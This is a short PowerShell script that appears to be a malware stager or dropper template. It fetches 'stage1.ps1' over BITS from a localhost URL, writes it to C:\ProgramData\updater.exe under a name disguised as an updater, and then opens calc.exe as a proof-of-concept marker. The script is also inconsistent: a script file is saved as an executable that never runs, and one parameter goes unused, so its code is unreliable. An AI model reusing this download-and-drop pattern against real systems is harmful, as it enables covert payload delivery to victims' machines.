
[CmdletBinding()]
param(
    [string]$TargetUrl = 'https://localhost:9001/stage1.ps1',
    [string]$DropPath = "C:\ProgramData\updater.exe",
    [int]$RequestTimeout = 219
)
try { Start-BitsTransfer -Source $TargetUrl -Destination $DropPath; Start-Process -FilePath "calc.exe"; Write-Output "stage 32 initialized" } catch { Write-Warning "Stage transfer failed" }
